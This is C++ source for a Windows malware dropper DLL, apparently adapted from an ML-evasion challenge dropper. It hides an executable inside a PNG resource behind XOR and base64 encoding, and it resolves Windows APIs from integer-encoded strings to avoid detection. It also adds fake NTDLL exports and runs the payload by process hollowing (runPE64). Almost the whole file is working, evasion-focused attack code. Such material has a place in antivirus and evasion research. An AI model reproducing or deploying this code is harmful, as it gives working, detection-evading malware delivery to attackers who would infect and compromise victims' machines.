// Drops and executes an Executable Binary from PNG Image Resources
// Based on Marcus Botacin's dropper for the MLSEC challenge
// Modified to support PNG image conversion using lodepng

// Required Imports
#include<stdio.h>		// Debug Prints
#include<Windows.h>		// Resource Management
#include"resource.h"	// Resources Definition
#include<time.h>		// rand seed
#include<math.h>		// sqrt function
#include"lodepng.h"		// PNG decoding

// Imports for the dead code function
#include<commctrl.h>
#include<shlobj.h>
#include<Uxtheme.h>
#include<atlstr.h>
#include<atlenc.h>

// Functions prototypes
void* XOR(void *data, int size);
void* base64decode(void *data,DWORD *size);
void* png_to_pe(unsigned char* png_data, size_t png_size, DWORD* pe_size);

// Dropper Configurations
//#define DEAD_IMPORTS
#define XOR_ENCODE
#define XOR_KEY 0x35
#define BASE64
#define RANDOM_NAME
#define NAME_SIZE 10
#define PNG_DECODE
//#define INJECT

// Dynamic imports structure (same as original)
typedef HRSRC (WINAPI *MyFindResourceW)(HMODULE,LPCWSTR,LPCWSTR);
typedef HGLOBAL (WINAPI *MyLoadResource)(HMODULE,HRSRC);
typedef LPVOID (WINAPI *MyLockResource)(HGLOBAL);
typedef DWORD (WINAPI *MySizeofResource)(HMODULE,HRSRC);
typedef BOOL (WINAPI *MyCreateProcessA)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
typedef void* (*Mymalloc)(size_t);
typedef void (*Mysrand)(unsigned int);
typedef __time64_t (*My_time64)(__time64_t*);
typedef int (*Myrand)(void);
typedef FILE* (*Myfopen)(const char*, const char*);
typedef int (*Myfprintf)(FILE*, const char*, ...);
typedef int (*Myfclose)(FILE*);
typedef void (*Myfree)(void*);

// Global variables for dynamic imports
HMODULE k32;
HMODULE msc;
MyFindResourceW frw;
MyLoadResource mlr;
MyLockResource mlor;
MySizeofResource sor;
Mymalloc mm;
Mysrand srd;
My_time64 tm;
Myrand rd;
Myfopen fop;
Myfprintf fpf;
Myfclose fcl;
Myfree fr;
MyCreateProcessA cp;

// creates lots of dead exports to mimic the NTDLL (truncated for brevity)
extern "C" { __declspec(dllexport) void A_SHAFinal() { return; } }
extern "C" { __declspec(dllexport) void A_SHAInit() { return; } }
extern "C" { __declspec(dllexport) void A_SHAUpdate() { return; } }
extern "C" { __declspec(dllexport) void AlpcAdjustCompletionListConcurrencyCount() { return; } }
// ... (keeping same dead exports as original)

// decode strings
// it is important to not leave strings in clear
char dec[1024];
char* decode(int *encoded, int size)
{
	for(int i=0;i<size;i++)
	{
	    // I put it in a for so one can modify the encoding to something more complex
		dec[i] = char(encoded[i]);
	}
	return dec;
}

// Strings encoded as int arrays
int k32enc[] = {75,101,114,110,101,108,51,50,46,100,108,108,0};
int mscenc[] ={77,83,86,67,82,49,49,48,46,68,76,76,0};
int findrsrcenc[] ={70,105,110,100,82,101,115,111,117,114,99,101,87,0};
int loadrsrcenc[] ={76,111,97,100,82,101,115,111,117,114,99,101,0};
int lockrsrcenc[] ={76,111,99,107,82,101,115,111,117,114,99,101,0};
int szrsrcenc[] ={83,105,122,101,111,102,82,101,115,111,117,114,99,101,0};
int cprocenc[] ={67,114,101,97,116,101,80,114,111,99,101,115,115,65,0};
int mallocenc[] ={109,97,108,108,111,99,0};
int srandenc[] ={115,114,97,110,100,0};
int timeenc[] ={95,116,105,109,101,54,52,0};
int randenc[] ={114,97,110,100,0};
int fopenc[] ={102,111,112,101,110,0};
int fprintfenc[] ={102,112,114,105,110,116,102,0};
int fclosenc[] ={102,99,108,111,115,101,0};
int freenc[] ={102,114,101,101,0};

/* Entry Point */
BOOL APIENTRY DllMain(
   HANDLE hModule,
   DWORD ul_reason_for_call, 
   LPVOID lpReserved )
{
	/* Calling reason */
   switch ( ul_reason_for_call )
   {
	   /* Attached to a process */
      case DLL_PROCESS_ATTACH:
		  // I left the load and get proc as explicit apis bc it was obfuscated enough
          // if you want to hide them, parse the k32 manually
		  k32 = LoadLibraryA(decode(k32enc,13));
		  // resolve dynamic refs when starting
		  frw = (MyFindResourceW)GetProcAddress(k32,decode(findrsrcenc,14));
		  mlr = (MyLoadResource)GetProcAddress(k32,decode(loadrsrcenc,13));
		  mlor = (MyLockResource)GetProcAddress(k32,decode(lockrsrcenc,13));
		  sor = (MySizeofResource)GetProcAddress(k32,decode(szrsrcenc,15));
		  cp = (MyCreateProcessA)GetProcAddress(k32,decode(cprocenc,15));
		  msc = LoadLibraryA(decode(mscenc,13));
		  mm = (Mymalloc)GetProcAddress(msc,decode(mallocenc,7));
		  srd = (Mysrand)GetProcAddress(msc,decode(srandenc,6));
		  tm = (My_time64)GetProcAddress(msc,decode(timeenc,8));
		  rd = (Myrand)GetProcAddress(msc,decode(randenc,5));
		  fop = (Myfopen)GetProcAddress(msc,decode(fopenc,6));
		  fpf = (Myfprintf)GetProcAddress(msc,decode(fprintfenc,8));
		  fcl = (Myfclose)GetProcAddress(msc,decode(fclosenc,7));
		  fr = (Myfree)GetProcAddress(msc,decode(freenc,5));
		  // function that actually drops
          // this function was previously the main of the original dropper
          // must pass module handle to invoke the DLL and not the main process functions
		  run(hModule);
		break;
  
	  /* Attached to a thread */
      case DLL_THREAD_ATTACH:
	  /* Nothing to do */
      break;
      
	  /* Detached from a thread */
      case DLL_THREAD_DETACH:
      /* Nothing to do */
      break;
      
	  /* Detached  from a process */
      case DLL_PROCESS_DETACH:
      break;
   }
   return TRUE;
}

// Injection Method (same as original)
int runPE64(
    LPPROCESS_INFORMATION lpPI,
    LPSTARTUPINFO lpSI,
    LPVOID lpImage,
    LPWSTR wszArgs,
    SIZE_T szArgs
)
{
    WCHAR wszFilePath[MAX_PATH];
    if (!GetModuleFileName(
        NULL, 
        wszFilePath, 
        sizeof wszFilePath
    ))
    {
        return -1;
    }
    WCHAR wszArgsBuffer[MAX_PATH + 2048];
    ZeroMemory(wszArgsBuffer, sizeof wszArgsBuffer);
    SIZE_T length = wcslen(wszFilePath);
    memcpy(
        wszArgsBuffer, 
        wszFilePath, 
        length * sizeof(WCHAR)
    );
    wszArgsBuffer[length] = ' ';
    memcpy(
        wszArgsBuffer + length + 1, 
        wszArgs, 
        szArgs
    );

    PIMAGE_DOS_HEADER lpDOSHeader = 
        reinterpret_cast<PIMAGE_DOS_HEADER>(lpImage);
    PIMAGE_NT_HEADERS lpNTHeader = 
        reinterpret_cast<PIMAGE_NT_HEADERS>(
            reinterpret_cast<DWORD64>(lpImage) + lpDOSHeader->e_lfanew
        );
    if (lpNTHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        return -2;
    }

    if (!CreateProcess(
        NULL,
        wszArgsBuffer,
        NULL,
        NULL,
        TRUE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        lpSI,
        lpPI
    ))
    {
        return -3;
    }

    CONTEXT stCtx;
    ZeroMemory(&stCtx, sizeof stCtx);
    stCtx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(lpPI->hThread, &stCtx))
    {
        TerminateProcess(
            lpPI->hProcess,
            -4
        );
        return -4;
    }

    LPVOID lpImageBase = VirtualAllocEx(
        lpPI->hProcess,
        reinterpret_cast<LPVOID>(lpNTHeader->OptionalHeader.ImageBase),
        lpNTHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (lpImageBase == NULL)
    {
        TerminateProcess(
            lpPI->hProcess,
            -5
        );
        return -5;
    }

    if (!WriteProcessMemory(
        lpPI->hProcess,
        lpImageBase,
        lpImage,
        lpNTHeader->OptionalHeader.SizeOfHeaders,
        NULL
    ))
    {
        TerminateProcess(
            lpPI->hProcess,
            -6
        );
        return -6;
    }

    for (
        SIZE_T iSection = 0;
        iSection < lpNTHeader->FileHeader.NumberOfSections;
        ++iSection
        )
    {
        PIMAGE_SECTION_HEADER stSectionHeader =
            reinterpret_cast<PIMAGE_SECTION_HEADER>(
                reinterpret_cast<DWORD64>(lpImage) +
                lpDOSHeader->e_lfanew +
                sizeof(IMAGE_NT_HEADERS64) +
                sizeof(IMAGE_SECTION_HEADER) * iSection
                );

        if (!WriteProcessMemory(
            lpPI->hProcess,
            reinterpret_cast<LPVOID>(
                reinterpret_cast<DWORD64>(lpImageBase) +
                stSectionHeader->VirtualAddress
                ),
            reinterpret_cast<LPVOID>(
                reinterpret_cast<DWORD64>(lpImage) +
                stSectionHeader->PointerToRawData
                ),
            stSectionHeader->SizeOfRawData,
            NULL
        ))
        {
            TerminateProcess(
                lpPI->hProcess,
                -7
            );
            return -7;
        }
    }

    if (!WriteProcessMemory(
        lpPI->hProcess,
        reinterpret_cast<LPVOID>(
            stCtx.Rdx + sizeof(LPVOID) * 2
            ),
        &lpImageBase,
        sizeof(LPVOID),
        NULL
    ))
    {
        TerminateProcess(
            lpPI->hProcess,
            -8
        );
        return -8;
    }

    stCtx.Rcx = reinterpret_cast<DWORD64>(lpImageBase) +
        lpNTHeader->OptionalHeader.AddressOfEntryPoint;
    if (!SetThreadContext(
        lpPI->hThread,
        &stCtx
    ))
    {
        TerminateProcess(
            lpPI->hProcess,
            -9
        );
        return -9;
    }

    if (!ResumeThread(lpPI->hThread))
    {
        TerminateProcess(
            lpPI->hProcess,
            -10
        );
        return -10;
    }

    return 0;
}

// Launch the process with the payload injected in memory (same as original)
void launch(void *data, int size)
{
	 PROCESS_INFORMATION stPI;
    ZeroMemory(&stPI, sizeof stPI);
    STARTUPINFO stSI;
    ZeroMemory(&stSI, sizeof stSI);
    WCHAR szArgs[] = L"";
    runPE64(
        &stPI,
        &stSI,
        reinterpret_cast<LPVOID>(data),
        szArgs,
        sizeof szArgs);
}

// Convert PNG image data back to PE binary
void* png_to_pe(unsigned char* png_data, size_t png_size, DWORD* pe_size)
{
    unsigned char* image_data;
    unsigned width, height;
    
    // Decode PNG using lodepng
    unsigned error = lodepng_decode_memory(&image_data, &width, &height, png_data, png_size, LCT_GREY, 8);
    
    if (error) {
        // PNG decoding failed
        *pe_size = 0;
        return NULL;
    }
    
    // The original PE size should be embedded in the first 4 bytes of the image
    // or we can calculate based on the image metadata
    size_t total_image_size = width * height;
    
    // For now, we'll assume the entire image data is the PE (minus padding)
    // In a real implementation, you might want to store the original size
    // in the image metadata or as the first few bytes
    
    // Allocate buffer for PE data  
    void* pe_data = mm(total_image_size);
    if (!pe_data) {
        free(image_data);
        *pe_size = 0;
        return NULL;
    }
    
    // Copy image data to PE buffer
    memcpy(pe_data, image_data, total_image_size);
    
    // Free lodepng allocated memory
    free(image_data);
    
    // Try to find actual PE size by looking for valid PE structure
    // Look for PE signature to determine actual size
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)pe_data;
    if (dos_header->e_magic == IMAGE_DOS_SIGNATURE) {
        PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)pe_data + dos_header->e_lfanew);
        if (nt_headers->Signature == IMAGE_NT_SIGNATURE) {
            // Use the SizeOfImage from PE header as a better estimate
            *pe_size = nt_headers->OptionalHeader.SizeOfImage;
            if (*pe_size > total_image_size) {
                *pe_size = (DWORD)total_image_size;
            }
        } else {
            *pe_size = (DWORD)total_image_size;
        }
    } else {
        *pe_size = (DWORD)total_image_size;
    }
    
    return pe_data;
}

// Modified main dropper function to handle PNG images
void run(HANDLE hModule)
{
	// Handle to myself
	HMODULE h = (HMODULE)hModule;
	// Locate Resource (now looking for PNG resource)
	HRSRC r = frw(h,MAKEINTRESOURCE(IDR_PNG1),MAKEINTRESOURCE(PNG));
	// Load Resource
	HGLOBAL rc = mlr(h,r);
	// Ensure nobody else will handle it
	void* data = mlor(rc);
	// Get embedded file size
	DWORD size = sor(h,r);
	
	// Obfuscation Procedures start here
#ifdef XOR_ENCODE
	data = XOR(data,size);
#endif
#ifdef BASE64
	data = base64decode(data,&size);
#endif

#ifdef PNG_DECODE
    // Convert PNG back to PE
    DWORD pe_size;
    void* pe_data = png_to_pe((unsigned char*)data, size, &pe_size);
    if (pe_data && pe_size > 0) {
        // Free the PNG data and use PE data
        fr(data);
        data = pe_data;
        size = pe_size;
    }
#endif

	// launch process with in-memory injection
	launch(data,size);
}

// Decode a Base64 String (same as original)
void* base64decode(void *data,DWORD *size)
{
	// original string size
	int original_size = strlen((char*)data);
	// number of bytes after decoded
	int decoded_size = Base64DecodeGetRequiredLength(original_size);
	// temporary buffer to store the decoded bytes
	void *buffer2 = mm(decoded_size);
	// decoded
	Base64Decode((PCSTR)data,original_size,(BYTE*)buffer2,&decoded_size);
	// return new buffer size
	*size = decoded_size;
	// free buffer original
	fr(data);
	// return new buffer
	return buffer2;
}

// XOR bytes in the buffer with a key (same as original)
void* XOR(void *data, int size){
	// auxiliary buffer
	void *buffer = (void*)mm(size);
	for(int i=0;i<size;i++)
	{
		((char*)buffer)[i] = ((char*)data)[i] ^ XOR_KEY;
	}
	return buffer;
}